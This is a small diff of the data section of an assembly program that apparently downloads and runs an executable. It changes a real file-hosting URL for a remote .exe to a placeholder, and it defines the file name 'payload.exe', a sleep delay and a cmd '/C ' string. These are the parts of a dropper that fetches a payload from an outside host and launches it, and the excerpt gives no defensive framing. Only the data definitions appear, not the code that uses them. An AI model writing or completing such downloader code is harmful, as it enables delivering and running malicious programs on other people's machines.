@@ -32,7 +32,7 @@ section '.data' data readable writable
 
         sleepSeconds dd 5
 
-        url db 'http://file-st06.karelia.ru/v94q4w/9aa73dfa56fa5e487fd958cb39097baa/d78327849bb3e697a086267fbb48f053/ConsoleApplication1.exe',0
+        url db 'http://file.exe',0
         fileName db 'payload.exe',0
 
         s1 db '/C ',0
